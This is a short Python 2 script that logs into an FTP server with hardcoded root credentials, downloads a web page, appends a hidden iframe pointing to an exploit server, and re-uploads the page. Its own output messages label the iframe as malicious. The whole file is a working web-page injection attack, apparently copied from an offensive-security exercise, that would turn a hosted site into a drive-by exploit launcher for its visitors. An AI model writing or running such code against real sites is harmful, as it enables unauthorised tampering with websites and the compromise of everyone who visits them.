__author__ = 'derog'

import ftplib
def injectPage(ftp, page, redirect):
    f = open(page + '.tmp','w')
    ftp.retrlines('RETR ' +page, f.write)
    print '[+] Downloaded Page: ' + page
    f.write(redirect)
    f.close()
    print '[+] Injected Malicious IFrame on: '+ page
    ftp.storlines('STOR '+ page, open(page + '.tmp'))
    print '[+] Uploaded Injected Page: '+page

if __name__=="__main__":
    host = 'localhost'
    userName= 'root'
    password = 'toor'
    webfile='Google.html'
    ftp =ftplib.FTP(host)
    ftp.login(userName,password)
    redirect = '<iframe src=' + '"http://127.0.0.1:8080/exploit"></iframe>'
    injectPage(ftp,webfile,redirect)